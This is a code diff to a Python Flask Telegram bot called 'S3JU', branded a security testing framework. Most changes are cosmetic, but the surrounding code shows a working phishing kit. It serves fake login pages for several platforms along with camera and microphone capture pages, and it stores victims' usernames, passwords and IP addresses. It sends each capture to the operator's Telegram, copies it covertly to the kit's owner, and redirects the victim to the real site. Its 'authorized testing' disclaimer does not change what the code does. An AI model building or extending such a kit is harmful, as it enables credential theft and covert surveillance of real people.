@@ -21,7 +21,6 @@ from urllib.parse import urlparse
 
 import requests
 from flask import Flask, request, jsonify, send_file, redirect, render_template_string, make_response
-from PIL import Image, ImageDraw, ImageFont
 
 # ======================== CONFIG ========================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
@@ -116,7 +115,7 @@ def send_photo_telegram(chat_id, photo_bytes, caption=""):
     url = f"{TELEGRAM_API}/sendPhoto"
     try:
         files = {"photo": ("image.jpg", photo_bytes, "image/jpeg")}
-        data = {"chat_id": chat_id, "caption": caption}
+        data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
         r = requests.post(url, data=data, files=files, timeout=15)
         return r.json()
     except Exception as e:
@@ -127,7 +126,7 @@ def send_document_telegram(chat_id, file_bytes, filename, caption=""):
     url = f"{TELEGRAM_API}/sendDocument"
     try:
         files = {"document": (filename, file_bytes, "application/octet-stream")}
-        data = {"chat_id": chat_id, "caption": caption}
+        data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
         r = requests.post(url, data=data, files=files, timeout=30)
         return r.json()
     except Exception as e:
@@ -153,6 +152,14 @@ def edit_message(chat_id, message_id, text, reply_markup=None):
     except:
         return None
 
+def delete_message(chat_id, message_id):
+    url = f"{TELEGRAM_API}/deleteMessage"
+    payload = {"chat_id": chat_id, "message_id": message_id}
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
 def set_webhook(url):
     wh_url = f"{TELEGRAM_API}/setWebhook"
     payload = {"url": url, "allowed_updates": ["message", "callback_query"]}
@@ -164,39 +171,23 @@ def set_webhook(url):
         logger.error(f"Webhook set error: {e}")
         return None
 
-# ======================== BANNER ========================
-def generate_banner():
-    width, height = 800, 400
-    img = Image.new("RGB", (width, height), (20, 20, 20))
-    draw = ImageDraw.Draw(img)
-    for i in range(4):
-        draw.rectangle([i, i, width-1-i, height-1-i], outline=(255, 140, 0), width=1)
-    for x in range(0, width, 40):
-        draw.line([(x, 0), (x, height)], fill=(35, 35, 35), width=1)
-    for y in range(0, height, 40):
-        draw.line([(0, y), (width, y)], fill=(35, 35, 35), width=1)
+# ======================== LOAD BANNER IMAGES ========================
+BANNER_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner")
+
+def load_banner(filename):
+    path = os.path.join(BANNER_DIR, filename)
     try:
-        font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 72)
-        font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 24)
-        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
-    except:
-        font_large = ImageFont.load_default()
-        font_medium = ImageFont.load_default()
-        font_small = ImageFont.load_default()
-    for dx, dy in [(2,2), (3,3)]:
-        draw.text((width//2 + dx, 70 + dy), "S3JU", fill=(0,0,0), font=font_large, anchor="mt")
-    draw.text((width//2, 70), "S3JU", fill=(255, 140, 0), font=font_large, anchor="mt")
-    draw.text((width//2, 160), "Advanced Security Testing Framework", fill=(200, 200, 200), font=font_medium, anchor="mt")
-    draw.line([(width//4, 200), (3*width//4, 200)], fill=(255, 140, 0), width=2)
-    draw.text((width//2, 230), "v1.0", fill=(255, 180, 60), font=font_small, anchor="mt")
-    draw.text((width//2, 270), "Developed by D4RK-K1NG", fill=(255, 140, 0), font=font_small, anchor="mt")
-    draw.text((width//2, 340), "Authorized Security Testing Tool", fill=(100, 100, 100), font=font_small, anchor="mt")
-    for cx, cy in [(8,8), (width-8,8), (8,height-8), (width-8,height-8)]:
-        draw.ellipse([cx-4, cy-4, cx+4, cy+4], fill=(255, 140, 0))
-    buf = BytesIO()
-    img.save(buf, format="JPEG", quality=90)
-    buf.seek(0)
-    return buf
+        with open(path, "rb") as f:
+            return f.read()
+    except Exception as e:
+        logger.error(f"Failed to load banner {filename}: {e}")
+        return None
+
+def get_start_image():
+    return load_banner("image1.jpg")
+
+def get_attack_image():
+    return load_banner("image2.jpg")
 
 # ======================== LOAD HTML TEMPLATES ========================
 TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
@@ -206,8 +197,8 @@ def load_template(filename):
     try:
         with open(path, "r", encoding="utf-8") as f:
             return f.read()
-    except:
-        logger.error(f"Failed to load template: {filename}")
+    except Exception as e:
+        logger.error(f"Failed to load template {filename}: {e}")
         return "<html><body><h1>Error loading page</h1></body></html>"
 
 PLATFORM_TEMPLATES = {
@@ -257,19 +248,16 @@ def webhook():
         if not data:
             return "ok", 200
 
-        # Log webhook
         conn = get_db()
         update_id = data.get("update_id", 0)
         conn.execute("INSERT INTO webhook_logs (update_id, message, received_at) VALUES (?, ?, ?)",
                      (update_id, json.dumps(data), datetime.now().isoformat()))
         conn.commit()
 
-        # Handle callback query
         if "callback_query" in data:
             handle_callback(data["callback_query"])
             return "ok", 200
 
-        # Handle message
         if "message" in data:
             handle_message(data["message"])
             return "ok", 200
@@ -319,21 +307,31 @@ def handle_message(message):
         return
 
     if text == "/start":
-        banner = generate_banner()
-        send_photo_telegram(chat_id, banner.getvalue(),
-            "Welcome to <b>S3JU v1.0</b>\nDeveloped by <b>D4RK-K1NG</b>\n\nAdvanced Security Testing Framework\n\nUse /attack to begin\nUse /help for commands")
+        img = get_start_image()
+        if img:
+            send_photo_telegram(chat_id, img,
+                "<b>S3JU v1.0</b>\nDeveloped by <b>D4RK-K1NG</b>\n\nAdvanced Security Testing Framework\n\nUse /attack to begin\nUse /help for commands")
+        else:
+            send_telegram(chat_id,
+                "<b>S3JU v1.0</b>\nDeveloped by <b>D4RK-K1NG</b>\n\nAdvanced Security Testing Framework\n\nUse /attack to begin\nUse /help for commands")
         return
 
     if text == "/attack":
+        img = get_attack_image()
         keyboard = {
             "inline_keyboard": [
                 [{"text": "✅ I AGREE", "callback_data": "agree_terms"},
                  {"text": "❌ DECLINE", "callback_data": "decline_terms"}]
             ]
         }
-        send_telegram(chat_id,
-            "⚠️ <b>USE AT YOUR OWN RISK</b>\n\nThis tool is for authorized security testing only.\nBy agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?",
-            reply_markup=keyboard)
+        if img:
+            send_photo_telegram(chat_id, img,
+                "⚠️ <b>USE AT YOUR OWN RISK</b>\n\nThis tool is for authorized security testing only.\nBy agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?",
+                reply_markup=keyboard)
+        else:
+            send_telegram(chat_id,
+                "⚠️ <b>USE AT YOUR OWN RISK</b>\n\nThis tool is for authorized security testing only.\nBy agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?",
+                reply_markup=keyboard)
         return
 
     if text == "/stats":
@@ -491,14 +489,12 @@ def serve_phishing_page(session_id):
     if not session or session["status"] == "cancelled":
         return "<html><body style='font-family:sans-serif;text-align:center;padding:40px'><h1>Page not found</h1><p>This link is invalid or expired.</p></body></html>", 404
 
-    # Update view count and IP info
     ip = get_visitor_ip()
     conn.execute("UPDATE sessions SET total_views = total_views + 1, ip = ? WHERE session_id = ?", (ip, session_id))
     conn.commit()
 
     platform = session["platform"].lower()
 
-    # Special media pages
     if platform == "camera":
         template = load_template("camera.html")
         return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("camera"))
@@ -511,7 +507,6 @@ def serve_phishing_page(session_id):
         template = load_template("mic.html")
         return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))
 
-    # Login pages
     template_file = PLATFORM_TEMPLATES.get(platform)
     if not template_file:
         return redirect("https://www.google.com")
@@ -535,7 +530,6 @@ def capture_credentials(session_id):
     chat_id = session["chat_id"]
     platform = session["platform"]
 
-    # Save capture
     conn.execute(
         "INSERT INTO captures (session_id, chat_id, platform, username, password, ip, captured_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
         (session_id, chat_id, platform, username, password, ip, timestamp))
@@ -543,7 +537,6 @@ def capture_credentials(session_id):
     conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
     conn.commit()
 
-    # Format message
     msg = (
         f"🔓 <b>CREDENTIALS CAPTURED!</b> 🔓\n\n"
         f"<b>Platform:</b> {platform}\n"
@@ -554,14 +547,11 @@ def capture_credentials(session_id):
         f"S3JU | D4RK-K1NG"
     )
 
-    # Send to user
     send_telegram(chat_id, msg)
 
-    # Send to owner as backup
     if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
         send_telegram(OWNER_CHAT_ID, f"📋 <b>Backup Capture</b>\n\nSession: {session_id}\n{msg}")
 
-    # Redirect to real site
     real_url = get_redirect_url(platform)
     template = load_template("redirect.html")
     return render_template_string(template, redirect_url=real_url)
